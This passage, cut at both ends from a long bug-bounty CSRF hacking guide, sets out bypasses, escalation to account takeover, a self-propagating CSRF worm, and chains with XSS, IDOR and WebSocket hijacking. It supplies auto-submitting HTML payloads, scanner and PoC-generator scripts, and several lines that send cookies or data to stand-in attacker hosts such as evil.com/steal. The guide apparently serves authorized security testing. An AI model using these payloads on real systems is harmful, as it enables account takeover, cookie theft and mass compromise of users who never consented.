→ Contains "target.com" → passes check!

Bypass 2: Use subdomain:
Create: target.com.evil.com
→ Referer: https://target.com.evil.com/
→ Starts with "target.com" → passes check!

Bypass 3: Use query parameter:
https://evil.com/poc.html?ref=target.com
→ Referer contains "target.com"

Bypass 4: URL fragment:
https://evil.com/poc.html#target.com
→ Note: fragments aren't sent in Referer, but the path could be
```

### Bypass 9: Content-Type Bypass for JSON APIs

```
Server expects: Content-Type: application/json
Form sends:     Content-Type: application/x-www-form-urlencoded

Bypass 1: text/plain enctype
<form enctype="text/plain" action="https://target.com/api/update" method="POST">
    <input name='{"email":"evil@hacker.com","x":"' value='"}'>
</form>
Sends: Content-Type: text/plain
Body: {"email":"evil@hacker.com","x":"="}
→ Many JSON parsers accept text/plain!

Bypass 2: navigator.sendBeacon
navigator.sendBeacon('https://target.com/api/update', 
    new Blob(['{"email":"evil@hacker.com"}'], {type: 'text/plain'}));

Bypass 3: Server accepts multiple Content-Types
Try sending as application/x-www-form-urlencoded:
POST /api/update HTTP/1.1
Content-Type: application/x-www-form-urlencoded

email=evil@hacker.com
→ Some servers auto-detect and parse form data too
```

### Bypass 10: CORS Misconfiguration

```
If the server has a CORS misconfiguration:

Access-Control-Allow-Origin: https://evil.com  (or reflects any origin)
Access-Control-Allow-Credentials: true

Then XHR/fetch CSRF works with full JSON:

fetch('https://target.com/api/change-email', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({email: 'evil@hacker.com'})
});

Check for common CORS misconfigurations:
├── Reflects any Origin header back
├── Allows null origin
├── Regex flaw: evil.com.target.com matches .*target\.com
├── Wildcard with credentials: Allow-Origin: * + Allow-Credentials: true
└── Only checks origin on OPTIONS, not on actual POST
```

### Bypass 11: SameSite Cookie Bypass via GET + Top-Level Navigation

```
SameSite=Lax blocks cross-site POST but allows GET on top-level navigation.

If the endpoint accepts GET (even if designed for POST):
<a href="https://target.com/change-email?email=evil@hacker.com">
    Click to claim your prize!
</a>

Or auto-redirect:
<script>window.location='https://target.com/change-email?email=evil@hacker.com'</script>

Or method override:
<script>window.location='https://target.com/change-email?_method=POST&email=evil@hacker.com'</script>
(Some frameworks support _method override in query parameters)
```

### Bypass 12: Token Leakage via Referer

```
If the CSRF token appears in the URL:
https://target.com/settings?csrf_token=abc123

And the page loads an external resource (image, script):
<img src="https://external-tracker.com/pixel.gif">

The Referer header sent to external-tracker.com contains:
Referer: https://target.com/settings?csrf_token=abc123

Attack:
1. Attacker controls external-tracker.com
2. Reads the token from Referer logs
3. Uses the token in CSRF attack
```

### Bypass 13: Clickjacking + CSRF

```
If the target doesn't use X-Frame-Options or CSP frame-ancestors:

<html>
<body>
<!-- Invisible iframe over a "Click here" button -->
<div style="position:relative;width:500px;height:500px;">
    <iframe src="https://target.com/settings" 
            style="opacity:0.0001; position:absolute; width:100%; height:100%; z-index:2;">
    </iframe>
    <div style="z-index:1; position:absolute; top:200px; left:100px;">
        <h1>Click here to claim your $100 gift card!</h1>
        <button style="font-size:24px;padding:20px;">CLAIM NOW</button>
    </div>
</div>
</body>
</html>

Victim clicks "CLAIM NOW" but actually clicks a button inside the iframe
(e.g., "Delete Account" or "Confirm Transfer")
```

### Bypass 14: Subdomain-Based Cookie Tossing (Double Submit Bypass)

```
If the CSRF defense uses double-submit cookies:
1. Cookie: csrf=random123
2. Form: csrf_token=random123
3. Server checks: cookie value == form value

Attack (requires subdomain XSS or subdomain control):
1. Attacker controls evil.subdomain.target.com
2. Attacker sets: document.cookie = "csrf=attacker_value; domain=.target.com"
3. This cookie is now sent to ALL *.target.com pages
4. Attacker creates form with csrf_token=attacker_value
5. Cookie (attacker_value) == Form (attacker_value) → Match! → Bypass!
```

### Bypass 15: Race Condition on Token Rotation

```
If tokens rotate on each request:
1. Load the settings page → Get token T1
2. Submit request with T1 → New token T2 generated
3. T1 should be invalid now

But in race condition:
1. Load settings page → Get token T1
2. Send 10 requests simultaneously, all with T1
3. Some requests may slip through before T1 is invalidated
```

### Bypass Summary Table

```
┌────────────────────────────────────┬────────────┬────────────────────────────┐
│ Bypass                             │ Difficulty │ Works Against              │
├────────────────────────────────────┼────────────┼────────────────────────────┤
│ Token removal                      │ Easy       │ Token not validated        │
│ Empty token                        │ Easy       │ Weak validation logic      │
│ HTTP method switch (POST→GET)      │ Easy       │ Method-specific protection │
│ Cross-session token                │ Easy       │ Token not tied to session  │
│ Token from another endpoint        │ Easy       │ Shared token pool          │
│ Null Origin                        │ Medium     │ Origin validation          │
│ Referer suppression                │ Easy       │ Referer validation         │
│ Referer validation flaws           │ Medium     │ Regex/string matching      │
│ Content-Type bypass (text/plain)   │ Medium     │ JSON-only endpoints        │
│ CORS misconfiguration              │ Medium     │ Custom header requirement  │
│ SameSite + GET override            │ Medium     │ SameSite=Lax              │
│ Token leakage via Referer          │ Medium     │ Token in URL              │
│ Clickjacking + CSRF                │ Medium     │ Button-click actions       │
│ Cookie tossing (subdomain)         │ Hard       │ Double-submit cookies      │
│ Race condition                     │ Hard       │ Token rotation             │
└────────────────────────────────────┴────────────┴────────────────────────────┘
```

---

## 12. ⚡ Escalation Techniques

Found a CSRF? Don't just report "CSRF on profile page." Escalate it to maximize impact and bounty value.

### Escalation 1: CSRF → Account Takeover (ATO)

The holy grail. If you can chain CSRF into full ATO, severity jumps from Medium to Critical.

**Path A: Email Change CSRF**
```
1. CSRF changes victim's email to attacker@evil.com
2. Attacker uses "Forgot Password" → Reset link sent to attacker@evil.com
3. Attacker resets password
4. Full account takeover

PoC:
<html>
<body>
<h1>Loading your invoice...</h1>
<form id="csrfForm" action="https://target.com/account/email" method="POST">
    <input type="hidden" name="new_email" value="attacker@evil.com">
</form>
<script>
    document.getElementById('csrfForm').submit();
</script>
</body>
</html>

Impact statement:
"An attacker can change the victim's registered email address via CSRF,
then initiate a password reset to gain full account access. This results
in complete Account Takeover (ATO)."
```

**Path B: Password Change CSRF (no current password required)**
```
POST /change-password HTTP/1.1
new_password=hacked123&confirm_password=hacked123

If the endpoint doesn't require the current password → direct ATO:
<form action="https://target.com/change-password" method="POST">
    <input name="new_password" value="attacker_password_123">
    <input name="confirm_password" value="attacker_password_123">
</form>
```

**Path C: Add Attacker's OAuth/SSO Connection**
```
1. CSRF adds attacker's Google/GitHub account as SSO login
2. Attacker logs in via "Sign in with Google" using their account
3. Gets access to victim's account

POST /settings/connected-accounts HTTP/1.1
provider=google&oauth_id=attacker_google_id_12345
```

**Path D: Disable 2FA via CSRF**
```
1. Victim has 2FA enabled (attacker can't login even with password)
2. CSRF disables 2FA
3. Attacker uses previously obtained credentials → Login succeeds

POST /settings/2fa/disable HTTP/1.1
confirm=true
```

### Escalation 2: Privilege Escalation via CSRF

```
Scenario: CSRF on role change endpoint

POST /team/member/USER_ID/role HTTP/1.1
role=admin

Attack:
1. Attacker creates a free account → Gets their USER_ID
2. Sends CSRF link to an admin of a target team
3. Admin clicks link → Attacker's account promoted to admin
4. Attacker now has admin access to victim's workspace

PoC:
<form action="https://target.com/team/member/attacker_user_id/role" method="POST">
    <input name="role" value="admin">
</form>
<script>document.forms[0].submit()</script>

Impact: "Attacker can escalate their own privileges from free-tier user
to workspace administrator by having any existing admin visit a
crafted page. This grants access to all team data, billing, and
the ability to remove other admins."
```

### Escalation 3: Self-Propagating CSRF Worm

```
The most dangerous escalation. CSRF that spreads from victim to victim.

Scenario: Social media platform with CSRF on:
1. POST /post → Create a post
2. POST /follow → Follow a user

Worm PoC:
<html>
<body>
<!-- Step 1: Force victim to follow the attacker -->
<iframe style="display:none" name="followFrame"></iframe>
<form target="followFrame" action="https://social.com/follow" method="POST">
    <input name="user_id" value="attacker_id">
</form>

<!-- Step 2: Force victim to create a post with the CSRF link -->
<iframe style="display:none" name="postFrame"></iframe>
<form target="postFrame" action="https://social.com/post" method="POST">
    <input name="content" value="Check this out! 
    https://attacker.com/csrfworm.html">
</form>

<script>
    // Submit both forms
    document.forms[0].submit();
    setTimeout(function(){ document.forms[1].submit(); }, 1000);
</script>
</body>
</html>

Chain: Victim A clicks link → Follows attacker + posts worm link →
       Victim A's followers see the post → Victim B clicks → 
       Follows attacker + posts worm link → ... 
       EXPONENTIAL SPREAD
```

### Escalation 4: Financial Impact CSRF

```
Scenario: E-commerce or payment platform

CSRF on shipping address change:
POST /account/address HTTP/1.1
address=Attacker's+Address&city=Evil+City&zip=13337

Attack flow:
1. Victim has pending order
2. CSRF changes their shipping address
3. Order ships to attacker's address
4. Victim loses their purchase

CSRF on payment method:
POST /billing/payment-method HTTP/1.1
card_number=ATTACKER_CARD&expiry=12/27&cvv=123

CSRF on subscription upgrade:
POST /billing/upgrade HTTP/1.1
plan=enterprise&billing_cycle=annual
→ Charges victim's saved card for enterprise plan
```

### Escalation 5: Data Exfiltration via CSRF

```
CSRF alone can't read responses (SOP blocks that).
But combined with other flaws, it CAN exfiltrate data.

Technique: CSRF + Open Redirect + URL parameter reflection

1. CSRF on export endpoint:
POST /export/contacts HTTP/1.1
format=csv&callback_url=https://attacker.com/collect

If the app sends the exported data to a callback URL → data exfiltrated!

2. CSRF + Self-XSS → Stored XSS:
POST /profile/bio HTTP/1.1
bio=<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>

If CSRF sets attacker-controlled content that's rendered to OTHER users →
turns Self-XSS into Stored XSS → steals data from everyone who views the profile
```

### Escalation Impact Matrix

```
┌─────────────────────────────┬───────────────────┬────────────┬──────────┐
│ Escalation                  │ Impact            │ CVSS       │ Bounty   │
├─────────────────────────────┼───────────────────┼────────────┼──────────┤
│ Email change → ATO          │ Full account loss │ 8.0-9.3    │ $2K-$25K │
│ Password change → ATO       │ Full account loss │ 8.0-9.3    │ $2K-$25K │
│ Disable 2FA + credential    │ Full account loss │ 7.5-8.5    │ $1K-$15K │
│ Privilege escalation        │ Admin access      │ 8.0-9.0    │ $1K-$20K │
│ Self-propagating worm       │ Mass compromise   │ 9.0-10.0   │ $5K-$50K │
│ Financial (address/payment) │ Financial loss    │ 7.0-8.5    │ $1K-$10K │
│ Data exfiltration           │ Data breach       │ 7.0-9.0    │ $2K-$15K │
│ Profile change (cosmetic)   │ Defacement only   │ 3.5-5.0    │ $50-$500 │
└─────────────────────────────┴───────────────────┴────────────┴──────────┘
```

---

## 13. 🔗 Chaining CSRF with Other Vulnerabilities

CSRF becomes exponentially more powerful when combined with other bugs.

### Chain 1: CSRF + Self-XSS = Stored XSS

```
Ingredients:
• Self-XSS on profile page (only fires when victim views their OWN profile)
• CSRF on profile update endpoint (no token required)

The problem with Self-XSS alone:
→ Victim has to paste payload into their own profile
→ No one would do that → Not exploitable → "Won't Fix"

Adding CSRF:
1. Attacker's page sends CSRF to update victim's profile name to:
   <script>document.location='https://attacker.com/steal?c='+document.cookie</script>
2. Victim visits their own profile later
3. XSS fires → cookies stolen → ATO

PoC:
<form action="https://target.com/profile/update" method="POST">
    <input name="display_name" 
           value='"><script>new Image().src="https://evil.com/steal?c="+document.cookie</script>'>
</form>
<script>document.forms[0].submit()</script>

Severity: Self-XSS alone = Informational/Low
          Self-XSS + CSRF = High/Critical
```

### Chain 2: CSRF + IDOR = Mass Account Takeover

```
Ingredients:
• CSRF on email change endpoint (no token)
• IDOR on user ID parameter (can target ANY user)

Alone:
• CSRF: Can change the email of whoever clicks your link
• IDOR: Can change any user's data but need authentication

Combined:
1. Attacker crafts: POST /api/user/VICTIM_ID/email  email=evil@hacker.com
2. CSRF makes the ADMIN send this request
3. IDOR means the admin's session can modify ANY user
4. Result: Mass account takeover by sending the link to one admin

<form action="https://target.com/api/user/1/email" method="POST">
    <input name="email" value="attacker@evil.com">
</form>
<form action="https://target.com/api/user/2/email" method="POST">
    <input name="email" value="attacker@evil.com">
</form>
<!-- ... repeat for all user IDs ... -->
<script>
for(let i=0; i < document.forms.length; i++){
    setTimeout(()=>document.forms[i].submit(), i*500);
}
</script>
```

### Chain 3: CSRF + Open Redirect = OAuth Token Theft

```
Ingredients:
• CSRF on OAuth authorization endpoint
• Open redirect on target's callback URL

Attack:
1. Normal OAuth flow:
   target.com/oauth/authorize?client_id=legit&redirect_uri=https://target.com/callback
   → Redirects to: https://target.com/callback?code=AUTH_CODE

2. Attack flow:
   target.com/oauth/authorize?client_id=legit&redirect_uri=https://target.com/redirect?url=https://evil.com
   → Open redirect sends auth code to: https://evil.com?code=AUTH_CODE

3. CSRF auto-triggers this:
<img src="https://target.com/oauth/authorize?client_id=legit&redirect_uri=https://target.com/redirect?url=https://evil.com&response_type=code">

4. Result: Attacker gets OAuth code → exchanges for token → ATO
```

### Chain 4: CSRF + Clickjacking = One-Click Attack

```
Ingredients:
• CSRF endpoint that requires user interaction (e.g., confirmation dialog)
• Missing X-Frame-Options on the confirmation page

Attack:
1. Target has a "Delete Account" button with a confirmation popup
2. CSRF alone fails because user must click "Confirm"
3. Clickjacking overlays an invisible iframe

<div style="position:relative">
    <!-- Bait content user wants to click -->
    <div style="position:absolute; z-index:1; top:250px; left:120px;">
        <button style="font-size:20px; background:green; color:white; padding:15px;">
            🎁 Claim Your $100 Amazon Gift Card
        </button>
    </div>
    
    <!-- Invisible target page with "Confirm Delete" button -->
    <iframe src="https://target.com/account/delete/confirm"
            style="position:absolute; z-index:2; opacity:0.0001;
                   width:600px; height:500px;">
    </iframe>
</div>
```

### Chain 5: Login CSRF + Credential Logging

```
Ingredients:
• CSRF on login endpoint (can force login as attacker)
• Target app logs user actions

Attack:
1. CSRF logs victim into ATTACKER's account
2. Victim doesn't notice (UI looks similar)
3. Victim performs actions thinking it's their account:
   → Enters credit card info
   → Uploads documents
   → Types messages
4. All actions are logged in attacker's account
5. Attacker checks their own account → sees all victim's data

<form action="https://target.com/login" method="POST">
    <input name="email" value="attacker@evil.com">
    <input name="password" value="attacker_password">
</form>
<script>document.forms[0].submit()</script>
```

### Chain 6: CSRF + WebSocket Hijacking

```
Ingredients:
• CSRF allows upgrading to WebSocket connection
• WebSocket endpoint doesn't verify Origin

Attack:
1. Victim visits attacker's page
2. JavaScript opens WebSocket to target:

<script>
var ws = new WebSocket('wss://target.com/ws/admin');
ws.onopen = function() {
    // Send command as authenticated victim
    ws.send(JSON.stringify({
        action: 'delete_all_users',
        confirm: true
    }));
};
ws.onmessage = function(event) {
    // Exfiltrate response data
    new Image().src = 'https://evil.com/exfil?data=' + 
                      encodeURIComponent(event.data);
};
</script>

WebSockets don't follow SOP the same way → if Origin isn't checked,
attacker can send AND receive data through victim's authenticated session!
```

### Chaining Impact Summary

```
CSRF + Self-XSS      = Stored XSS (Info → High)
CSRF + IDOR          = Mass Account Takeover (Medium → Critical)
CSRF + Open Redirect  = OAuth Token Theft (Low → High)  
CSRF + Clickjacking   = One-Click Account Deletion (Medium → High)
CSRF + Login CSRF     = Credential/Data Harvesting (Low → High)
CSRF + WebSocket      = Real-Time Data Theft (Medium → Critical)
```

---

## 14. 🤖 Automation & Scripting

Manual testing is essential, but automation lets you test at scale.

### Tool 1: Python CSRF Scanner

```python
#!/usr/bin/env python3
"""
CSRF Scanner v1.0 — by Vishal
Scans endpoints for missing/weak CSRF protections

Usage:
    python3 csrf_scanner.py -u https://target.com -c "session=abc123"
"""

import requests
import argparse
import re
import json
import sys
from datetime import datetime
from urllib.parse import urlparse, urljoin

class CSRFScanner:
    def __init__(self, base_url, cookies, headers=None, verbose=False):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.verbose = verbose
        self.findings = []
        
        # Parse cookies
        for cookie in cookies.split(';'):
            if '=' in cookie:
                name, value = cookie.strip().split('=', 1)
                self.session.cookies.set(name, value)
        
        if headers:
            self.session.headers.update(headers)
    
    def check_csrf_token(self, url, method='POST', data=None):
        """Check if an endpoint validates CSRF tokens properly."""
        results = {}
        
        # Test 1: Normal request (baseline)
        try:
            resp = self.session.request(method, url, data=data)
            results['baseline'] = resp.status_code
        except Exception as e:
            results['baseline'] = f'Error: {e}'
            return results
        
        # Test 2: Remove CSRF token
        if data:
            data_no_token = {k: v for k, v in data.items() 
                           if 'csrf' not in k.lower() and 'token' not in k.lower()
                           and '_token' not in k.lower() and 'xsrf' not in k.lower()}
            try:
                resp = self.session.request(method, url, data=data_no_token)
                results['no_token'] = resp.status_code
                if resp.status_code == 200:
                    self.findings.append({
                        'url': url,
                        'method': method,
                        'vuln': 'CSRF token not required',
                        'severity': 'HIGH'
                    })
            except Exception as e:
                results['no_token'] = f'Error: {e}'
        
        # Test 3: Empty token
        if data:
            data_empty = data.copy()
            for key in data_empty:
                if any(t in key.lower() for t in ['csrf', 'token', 'xsrf', '_token']):
                    data_empty[key] = ''
            try:
                resp = self.session.request(method, url, data=data_empty)
                results['empty_token'] = resp.status_code
                if resp.status_code == 200:
                    self.findings.append({
                        'url': url,
                        'method': method,
                        'vuln': 'Empty CSRF token accepted',
                        'severity': 'HIGH'
                    })
            except Exception as e:
                results['empty_token'] = f'Error: {e}'
        
        # Test 4: Random token
        if data:
            data_random = data.copy()
            for key in data_random:
                if any(t in key.lower() for t in ['csrf', 'token', 'xsrf', '_token']):
                    data_random[key] = 'INVALID_RANDOM_TOKEN_12345'
            try:
                resp = self.session.request(method, url, data=data_random)
                results['random_token'] = resp.status_code
                if resp.status_code == 200:
                    self.findings.append({
                        'url': url,
                        'method': method,
                        'vuln': 'Random CSRF token accepted',
                        'severity': 'HIGH'
                    })
            except Exception as e:
                results['random_token'] = f'Error: {e}'
        
        # Test 5: Method switch (POST → GET)
        if method == 'POST':
            try:
                resp = self.session.get(url, params=data)
                results['method_switch'] = resp.status_code
                if resp.status_code == 200:
                    self.findings.append({
                        'url': url,
                        'method': 'GET (switched from POST)',
                        'vuln': 'POST endpoint also accepts GET',
                        'severity': 'MEDIUM'
                    })
            except Exception as e:
                results['method_switch'] = f'Error: {e}'
        
        return results
    
    def check_samesite(self):
        """Check SameSite attributes on cookies."""
        resp = self.session.get(self.base_url)
        samesite_results = []
        
        for cookie in resp.cookies:
            samesite = 'Not Set (defaults to Lax in modern browsers)'
            # Check raw Set-Cookie header
            for header_val in resp.headers.get('Set-Cookie', '').split(','):
                if cookie.name in header_val:
                    if 'SameSite=Strict' in header_val:
                        samesite = 'Strict'
                    elif 'SameSite=Lax' in header_val:
                        samesite = 'Lax'
                    elif 'SameSite=None' in header_val:
                        samesite = 'None'
            
            samesite_results.append({
                'name': cookie.name,
                'samesite': samesite,
                'secure': cookie.secure,
                'httponly': 'httponly' in str(cookie._rest).lower()
            })
            
            if samesite == 'None':
                self.findings.append({
                    'url': self.base_url,
                    'method': 'N/A',
                    'vuln': f'Cookie "{cookie.name}" has SameSite=None',
                    'severity': 'MEDIUM'
                })
        
        return samesite_results
    
    def check_cors(self, url):
        """Check for CORS misconfigurations that enable CSRF."""
        test_origins = [
            'https://evil.com',
            'null',
            f'https://{urlparse(url).hostname}.evil.com',
            f'https://evil.{urlparse(url).hostname}',
        ]
        
        cors_results = []
        for origin in test_origins:
            headers = {'Origin': origin}
            try:
                resp = self.session.options(url, headers=headers)
                acao = resp.headers.get('Access-Control-Allow-Origin', 'Not set')
                acac = resp.headers.get('Access-Control-Allow-Credentials', 'Not set')
                
                if acao == origin or acao == '*':
                    cors_results.append({
                        'origin': origin,
                        'acao': acao,
                        'acac': acac,
                        'vulnerable': True
                    })
                    self.findings.append({
                        'url': url,
                        'method': 'OPTIONS',
                        'vuln': f'CORS reflects origin: {origin}',
                        'severity': 'HIGH'
                    })
            except Exception:
                pass
        
        return cors_results
    
    def generate_poc(self, url, method, data):
        """Generate a CSRF PoC HTML page."""
        if method.upper() == 'GET':
            params = '&'.join(f'{k}={v}' for k, v in data.items())
            poc = f"""<!DOCTYPE html>
<html>
<head><title>CSRF PoC — Generated by CSRF Scanner</title></head>
<body>
<h1>CSRF Proof of Concept</h1>
<p>Target: {url}</p>
<script>
window.location = "{url}?{params}";
</script>
</body>
</html>"""
        else:
            inputs = '\n    '.join(
                f'<input type="hidden" name="{k}" value="{v}">'
                for k, v in data.items()
            )
            poc = f"""<!DOCTYPE html>
<html>
<head><title>CSRF PoC — Generated by CSRF Scanner</title></head>
<body>
<h1>CSRF Proof of Concept</h1>
<p>Target: {url}</p>
<form id="csrfForm" action="{url}" method="{method}">
    {inputs}
</form>
<script>
    document.getElementById('csrfForm').submit();
</script>
</body>
</html>"""
        return poc
    
    def print_report(self):
        """Print scan results."""
        print("\n" + "="*60)
        print(f"  CSRF Scan Report — {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"  Target: {self.base_url}")
        print("="*60)
        
        if not self.findings:
            print("\n  ✅ No CSRF vulnerabilities found!")
        else:
            print(f"\n  ⚠️  Found {len(self.findings)} potential CSRF issues:\n")
            for i, f in enumerate(self.findings, 1):
                print(f"  [{i}] {f['severity']} — {f['vuln']}")
                print(f"      URL: {f['url']}")
                print(f"      Method: {f['method']}")
                print()
        
        print("="*60)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='CSRF Scanner v1.0 by Vishal')
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-c', '--cookies', required=True, help='Session cookies')
    parser.add_argument('-d', '--data', help='POST data (key=val&key=val)')
    parser.add_argument('-v', '--verbose', action='store_true')
    
    args = parser.parse_args()
    
    scanner = CSRFScanner(args.url, args.cookies, verbose=args.verbose)
    
    # Parse POST data
    data = {}
    if args.data:
        for param in args.data.split('&'):
            if '=' in param:
                k, v = param.split('=', 1)
                data[k] = v
    
    print(f"\n[*] Scanning {args.url} for CSRF vulnerabilities...\n")
    
    # Run checks
    print("[*] Checking SameSite cookies...")
    samesite = scanner.check_samesite()
    for cookie in samesite:
        print(f"    Cookie: {cookie['name']} → SameSite={cookie['samesite']}")
    
    print("\n[*] Checking CORS configuration...")
    cors = scanner.check_cors(args.url)
    
    if data:
        print(f"\n[*] Testing CSRF token validation on {args.url}...")
        results = scanner.check_csrf_token(args.url, data=data)
        for test, status in results.items():
            symbol = '✅' if status == 200 else '❌'
            print(f"    {test}: {symbol} {status}")
    
    scanner.print_report()
```

### Tool 2: HTML PoC Template Generator (Bash)

```bash
#!/bin/bash
# csrf_poc_gen.sh — Quick CSRF PoC Generator by Vishal
# Usage: ./csrf_poc_gen.sh -u URL -m METHOD -d "param1=val1&param2=val2"

URL=""
METHOD="POST"
DATA=""
OUTPUT="csrf_poc.html"

while getopts "u:m:d:o:" opt; do
    case $opt in
        u) URL="$OPTARG" ;;
        m) METHOD="$OPTARG" ;;
        d) DATA="$OPTARG" ;;
        o) OUTPUT="$OPTARG" ;;
        *) echo "Usage: $0 -u URL -m METHOD -d DATA [-o OUTPUT]"; exit 1 ;;
    esac
done

if [ -z "$URL" ]; then
    echo "Error: URL is required (-u)"
    exit 1
fi

echo "<!DOCTYPE html>" > "$OUTPUT"
echo "<html>" >> "$OUTPUT"
echo "<head><title>CSRF PoC</title></head>" >> "$OUTPUT"
echo "<body>" >> "$OUTPUT"
echo "<h1>CSRF Proof of Concept</h1>" >> "$OUTPUT"
echo "<p>Target: $URL | Method: $METHOD</p>" >> "$OUTPUT"
echo "<form id=\"csrfForm\" action=\"$URL\" method=\"$METHOD\">" >> "$OUTPUT"

# Parse parameters
IFS='&' read -ra PARAMS <<< "$DATA"
for param in "${PARAMS[@]}"; do
    key=$(echo "$param" | cut -d'=' -f1)
    val=$(echo "$param" | cut -d'=' -f2-)
    echo "    <input type=\"hidden\" name=\"$key\" value=\"$val\">" >> "$OUTPUT"
done

echo "</form>" >> "$OUTPUT"
echo "<script>document.getElementById('csrfForm').submit();</script>" >> "$OUTPUT"
echo "</body>" >> "$OUTPUT"
echo "</html>" >> "$OUTPUT"

echo "[+] CSRF PoC saved to: $OUTPUT"
echo "[+] Parameters:"
for param in "${PARAMS[@]}"; do
    echo "    → $param"
done
```

### Tool 3: Batch CSRF Token Tester

```python
#!/usr/bin/env python3
"""
Batch CSRF Token Tester — by Vishal
Tests multiple endpoints from a Burp exported file.

Usage:
    1. In Burp, select POST requests → Copy to file → Save as endpoints.txt
    2. python3 csrf_batch_test.py -f endpoints.txt -c "session=abc123"
"""

import requests
import argparse
import json
import re
from concurrent.futures import ThreadPoolExecutor, as_completed

def parse_burp_request(raw_request):
    """Parse a raw HTTP request into method, url, headers, body."""
    lines = raw_request.strip().split('\n')
    first_line = lines[0].strip()
    method, path, _ = first_line.split(' ', 2)
    
    headers = {}
    body = ''
    in_body = False
    host = ''
    
    for line in lines[1:]:
        line = line.strip()
        if not line:
            in_body = True
            continue
        if in_body:
            body += line
        else:
            if ':' in line:
                key, val = line.split(':', 1)
                headers[key.strip()] = val.strip()
                if key.strip().lower() == 'host':
                    host = val.strip()
    
    url = f"https://{host}{path}"
    return method, url, headers, body

def test_endpoint(url, method, data, cookies):
    """Test a single endpoint for CSRF."""
    session = requests.Session()
    for cookie in cookies.split(';'):
        if '=' in cookie:
            name, value = cookie.strip().split('=', 1)
            session.cookies.set(name, value)
    
    results = {'url': url, 'method': method, 'tests': {}}
    
    # Parse form data
    params = {}
    if data:
        for pair in data.split('&'):
            if '=' in pair:
                k, v = pair.split('=', 1)
                params[k] = v
    
    # Test: Remove all CSRF-like tokens
    clean_params = {k: v for k, v in params.items()
                    if not any(t in k.lower() for t in ['csrf', 'token', 'xsrf'])}
    
    try:
        if method.upper() == 'POST':
            resp = session.post(url, data=clean_params, allow_redirects=False)
        elif method.upper() == 'PUT':
            resp = session.put(url, data=clean_params, allow_redirects=False)
        else:
            resp = session.request(method, url, data=clean_params, allow_redirects=False)
        
        results['tests']['no_token'] = resp.status_code
        results['vulnerable'] = resp.status_code in [200, 301, 302]
    except Exception as e:
        results['tests']['no_token'] = str(e)
        results['vulnerable'] = False
    
    return results

def main():
    parser = argparse.ArgumentParser(description='Batch CSRF Tester by Vishal')
    parser.add_argument('-f', '--file', required=True, help='File with URLs')
    parser.add_argument('-c', '--cookies', required=True, help='Session cookies')
    parser.add_argument('-t', '--threads', type=int, default=5)
    
    args = parser.parse_args()
    
    with open(args.file) as f:
        urls = [line.strip() for line in f if line.strip()]
    
    print(f"[*] Testing {len(urls)} endpoints with {args.threads} threads...\n")
    
    vulnerable = []
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = {}
        for url in urls:
            # Simple format: METHOD URL DATA
            parts = url.split(' ', 2)
            method = parts[0] if len(parts) > 0 else 'POST'
            target = parts[1] if len(parts) > 1 else parts[0]
            data = parts[2] if len(parts) > 2 else ''
            
            future = executor.submit(test_endpoint, target, method, data, args.cookies)
            futures[future] = url
        
        for future in as_completed(futures):
            result = future.result()
            status = '🔴 VULNERABLE' if result['vulnerable'] else '✅ Protected'
            print(f"  {status} | {result['method']} {result['url']}")
            if result['vulnerable']:
                vulnerable.append(result)
    
    print(f"\n{'='*60}")
    print(f"  Results: {len(vulnerable)}/{len(urls)} endpoints potentially vulnerable")
    print(f"{'='*60}")

if __name__ == '__main__':
    main()
```

### Tool 4: Auto PoC Templates

Save these as reusable HTML files:

**Template A: Auto-Submit POST Form**
```html
<!-- csrf_post.html — Change ACTION, add/modify INPUT fields -->
<!DOCTYPE html>
<html>
<body>
<form id="f" action="TARGET_URL" method="POST">
    <input name="PARAM1" value="VALUE1">
    <input name="PARAM2" value="VALUE2">
</form>
<script>document.getElementById('f').submit()</script>
</body>
</html>
```

**Template B: JSON via text/plain**
```html
<!-- csrf_json.html — For JSON APIs that accept text/plain -->
<!DOCTYPE html>
<html>
<body>
<form id="f" action="TARGET_URL" method="POST" enctype="text/plain">
    <input name='{"key":"value","ignore":"' value='"}'>
</form>
<script>document.getElementById('f').submit()</script>
</body>
</html>
```

**Template C: Multi-Action (iframes for multiple endpoints)**
```html
<!-- csrf_multi.html — Hit multiple endpoints in one page load -->
<!DOCTYPE html>
<html>
<body>
<iframe style="display:none" name="f1"></iframe>
<iframe style="display:none" name="f2"></iframe>
<iframe style="display:none" name="f3"></iframe>

<form target="f1" action="TARGET_URL_1" method="POST">
    <input name="email" value="evil@hacker.com">
</form>

<form target="f2" action="TARGET_URL_2" method="POST">
    <input name="role" value="admin">
</form>

<form target="f3" action="TARGET_URL_3" method="POST">
    <input name="2fa_enabled" value="false">
</form>

<script>
document.forms[0].submit();
setTimeout(()=>document.forms[1].submit(), 500);
setTimeout(()=>document.forms[2].submit(), 1000);
</script>
</body>
</html>
```

**Template D: GET-based with auto-redirect**
```html
<!-- csrf_get.html — For GET-based state changes -->
<!DOCTYPE html>
<html>
<body>
<img src="TARGET_URL?param=value" style="display:none" 
     onerror="window.location='TARGET_URL?param=value'">
</body>
</html>
```

**Template E: Null Origin (sandbox iframe)**
```html
<!-- csrf_null_origin.html — Bypass Origin: validation via null -->
<!DOCTYPE html>
<html>
<body>
<iframe sandbox="allow-forms allow-scripts" srcdoc='
    <form id="f" action="TARGET_URL" method="POST">
        <input name="PARAM" value="VALUE">
    </form>
    <script>document.getElementById("f").submit()</script>
'></iframe>
</body>
</html>
```

---

## 15. 📋 Real Bug Bounty Case Studies

Real-world disclosed CSRF vulnerabilities with full details.

### Case Study 1: Facebook — CSRF Account Takeover ($25,000)

```
Platform: Facebook
Year: 2020
Hunter: Samm0uda
Bounty: $25,000

Discovery:
→ Found a CSRF on Facebook's OAuth endpoint
→ Could force users to authorize a malicious app
→ The app token could then access the victim's account

Flow:
1. Researcher found that facebook.com/v3.0/dialog/oauth
   didn't properly validate the 'state' parameter
2. Cross-site request could initiate OAuth flow
3. The response token leaked via redirect
4. Token granted full account access

Key Takeaway: 
→ OAuth endpoints are high-value CSRF targets
→ 'state' parameter validation is critical
→ Even Facebook's massive security team missed this
```

### Case Study 2: Shopify — CSRF on Partner Account ($15,000)

```
Platform: Shopify
Year: 2019
Hunter: @cache-money
Bounty: $15,000

Discovery:
→ CSRF on Shopify Partners portal
